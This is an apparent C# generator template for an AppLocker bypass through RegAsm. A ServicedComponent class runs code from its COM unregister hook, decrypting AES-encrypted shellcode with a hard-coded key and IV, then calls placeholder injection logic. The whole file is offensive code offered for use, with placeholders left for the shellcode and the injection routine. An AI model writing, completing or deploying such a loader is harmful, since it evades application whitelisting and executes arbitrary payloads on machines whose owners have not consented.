using System;
using System.Security.Cryptography;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


namespace AppLocker_RegAsm
{

    public class Bypass : ServicedComponent
    {
        
        {pinvoke_code}

        public Bypass() { Console.WriteLine(":3"); }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            // Shellcode
            {encrypted_shellcode}

            // Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] enckey = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(enckey, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }
            
            {injection_logic}

        }

    }

}